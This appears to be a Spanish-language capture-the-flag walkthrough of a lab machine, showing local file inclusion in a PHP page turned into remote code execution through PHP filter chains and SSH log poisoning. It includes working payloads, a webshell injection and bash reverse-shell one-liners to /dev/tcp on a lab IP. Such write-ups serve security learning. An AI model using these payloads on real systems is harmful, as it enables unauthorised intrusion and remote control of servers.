PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2211/tcp open  emwin
8888/tcp open  sun-answerbook

-Hacemos Fuzzing al puerto 80 y encontramos la siguiente ruta:
	-/antibot_image/antibots/info.php

-En el código fuente vemos este comentario:
	<!-- </?php include $_GET['image']; -->

-Probamos un Path Traversal:
	-http://192.168.236.133/antibot_image/antibots/info.php?image=/etc/passwd
		-VEMOS EL /ETC/PASSWD!!

-Probamos a enumerar los logs de Apache, SIN ÉXITO

-Probamos a enumerar los logs de SSH:
	-http://192.168.236.133/antibot_image/antibots/info.php?image=/var/log/auth.log
		-FUNCIONA!

## LFI to RCE (2 ways)

#### 1-RCE vía Filter Chains 

-Nos clonamos el siguiente repositorio;
	https://github.com/synacktiv/php_filter_chain_generator

-Le indicamos el Payload que queremos generar de esta forma:
	-python3 php_filter_chain_generator.py --chain "<?php system('id'); ?>  "
	(Nos genera un Payload muy largo)

-Lo introducimos en la URL aprovechando el LFI:
	-http://192.168.236.133/antibot_image/antibots/info.php?image=php://filter/convert.iconv.UTF8.CSISO2022KR|........ (Es muy largo)
		uid=33(www-data) gid=33(www-data) groups=33(www-data) 
			-HA FUNCIONADO!!, HA EJECUTADO EL COMANDO!!!

1-Generamos una webshell:
	-2 Formas de poner las comillas:
		1:![[Pasted image 20250503173851.png]]
		2:
		![[Pasted image 20250503174130.png]]
-Esto nos genera un cadena muy larga

2-Inyectamos la webshell, aprovechando el LFI:
	-http://192.168.236.133/antibot_image/antibots/info.php?image=COPIAMOS LA CADENA LARGA
		-Al actualizar la página vemos que hay una letras raras, es buena señal, eso es que hemos inyectado la webshell correctamente!!

3-Ejecutamos comandos a través de la webshell:
	-Cuando copiamos la CADENA LARGA en la URL, el final de la cadena es este:
		**=php://temp**
	-Aquí es dónde ejecutamos comandos:
		=php://temp&cmd=id
			uid=33(www-data) gid=33(www-data) groups=33(www-data) 
	-Nos mandamos una RS:
		=php://temp&cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.236.128/1234 0>%261'
			www-data@ubuntu:/$ whoami
			www-data

#### 2-RCE vía SSH Logs

-Estamos viendo los logs de SSH, probamos a autenticarnos con un usuario ramdom a ve si se queda guardado:
	-ssh pruebaLFI@192.168.236.133 -p 2211
	-Efectivamente , se refleja en los logs:
		Failed password for invalid user pruebaLFI from 192.168.236.128 port 57674 ssh2

-Con la versión actual de SSH, no podemos inyectar código malicioso, por ello vamos a desplegar un contenedor con Docker con una versión de SSH más antigua, seguimos estos pasos:
	[[Desplegar Docker - Versión SSH Antigua]]

-Nos autenticamos, inyectando un comando y vemos la respuesta en los logs:
	-ssh '<?php system('id');?>'@192.168.236.133 -p 2211
	-Password: loquesea --> CTRL + C 
	-Observamos la respuesta del servidor en los Logs a través del LFI:
		Failed password for invalid user **uid=33(www-data) gid=33(www-data) groups=33(www-data)**

-Inyectamos una webshell y obtenemos acceso a la máquina:
	-Inyectamos webshell:
		 ![[Pasted image 20250504174501.png]]
	-Nos mandamos una RS desde la URL:
		-http://192.168.236.133/antibot_image/antibots/info.php?image=/var/log/auth.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.236.128/1234%200%3E%261%27
			www-data@ubuntu:/$ whoami
			www-data

## Escalada de Privilegios



